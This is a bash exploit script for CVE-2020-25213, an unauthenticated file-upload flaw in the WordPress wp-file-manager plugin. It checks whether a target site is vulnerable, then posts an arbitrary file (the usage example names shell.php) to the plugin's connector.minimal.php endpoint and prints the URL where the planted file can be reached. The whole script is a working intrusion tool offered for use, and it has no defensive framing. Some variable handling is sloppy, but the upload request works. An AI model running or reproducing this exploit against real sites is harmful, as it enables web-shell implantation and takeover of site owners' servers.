#!/bin/bash

function helpMenu()
{
	echo -e "
	Usage:
	
	-u | --url 		+wordpress url
	-f | --file   		+path to file to upload wordpress
	-h | --help 		+help menu
	-c | --check 		+check the url is vulnerable to CVE-2020-25213
	
	
	Example:
	./exploit.sh --url http://example.com/wordpress -f ./shell.php
	"
}
check="false"

#Going through arguments entered
#untill we shift to the end of the given arguments
while [[ "$#" -gt 0 ]]
do
key="$1"
case "$key" in
	-u | --url)
		target_url="$2"
		shift
		shift 
		;;
	-f | --file)
		upload_file="$2"
		shift
		shift
		;;
	-c | --check)
		check="true"
		shift
		shift
		;;
	-h | --help)
		helpMenu
		exit
		shift
		;;
	*)
		echo [w] Enter valid options
		exit
		;;
		
esac

if [[ -z "$target_url" ]]
then
	echo "[w] Supply wordpress target url!" && exit;
fi

function checkWPFileManager()
{										#Takes 1 argument: url
	declare response=`curl $target_url/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`
	declare is_vulnerable=$(echo "$response" | grep "\{\"error\":\[\"errUnknownCmd\"\]\}")
	[[ -n "$is_vulnerable" ]] && echo "[+] Target: $url is vulnerable"
	[[ -z "$is_vulnerable" ]] && echo "[-] Target: $url is not vulnerable"
}

function exploit()
{
	curl -F cmd=upload -F target=l1_ -F debug=1 -F upload[]=@$upload_file -X POST $target_url/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
	echo "=================================================================================="
	echo "[+] file uploaded"
	echo "Run this command to access your file:"
	echo "	curl -iLsS $target_url/wp-content/plugins/wp-file-manager/lib/files/$upload_file"
	echo "Or use this link in browser:"
	echo "	$target_url/wp-content/plugins/wp-file-manager/lib/files/$upload_file"
	echo "==================================================================================="
}
[[ "$check" == "true" ]] && checkWPFileManager "$wp_url"
[[ -s "$upload_file" ]] && exploit "$wp_url" "$upload_file"
done
